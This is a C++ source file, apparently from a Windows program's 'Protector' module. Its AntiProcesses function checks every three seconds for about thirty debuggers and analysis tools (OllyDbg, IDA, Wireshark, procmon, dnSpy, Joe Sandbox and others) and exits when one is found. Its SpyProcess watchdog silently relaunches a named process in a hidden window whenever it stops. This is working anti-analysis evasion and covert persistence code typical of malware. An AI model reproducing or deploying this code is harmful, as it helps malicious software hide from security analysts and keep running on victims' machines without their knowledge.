/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Protector.h"
#include "Manager.h"

void Protector::AntiProcesses() {
	HANDLE hSnap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::vector<std::string> processes = {
		"ollydbg.exe",
		"processhacker.exe",
		"tcpview.exe",
		"autoruns.exe",
		"autorunsc.exe",
		"filemon.exe",
		"procmon.exe",
		"regmon.exe",
		"procexp.exe",
		"idaq.exe",
		"idaq64.exe",
		"immunitydebugger.exe",
		"wireshark.exe",
		"dumpcap.exe",
		"hookexplorer.exe",
		"importrec.exe",
		"petools.exe",
		"lordpe.exe",
		"sysinspector.exe",
		"proc_analyzer.exe",
		"sysanalyzer.exe",
		"sniff_hit.exe",
		"windbg.exe",
		"joeboxcontrol.exe",
		"joeboxserver.exe",
		"windanr.exe",
		"q.exe",
		"dnspy.exe",
		"idapro.exe",
		"httpdebugger.exe"
	};

	size_t size = processes.size();
	std::string process = "";
	while (true) {
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					for (size_t i = 0; i < size; i++) {
						process = pe32.szExeFile;
						std::transform(process.begin(), process.end(), process.begin(),
							[](unsigned char c) { return std::tolower(c); });
						if (process.find(processes[i]) != std::string::npos) {
							ExitProcess(0);
						}
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
		Sleep(3000);
	}
}

void Protector::SpyProcess(_SpyProcess* SP) {
	HANDLE hSnap = NULL;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::string process = "";
	while (true) {
		bool founded = false;
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					if (std::string(pe32.szExeFile).find(SP->procName) != std::string::npos) {
						founded = true;
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
		
		if (!founded)
			ShellExecuteA(0, "open", SP->procPath, "protected", 0, SW_HIDE);

		Sleep(1000);
	}
}
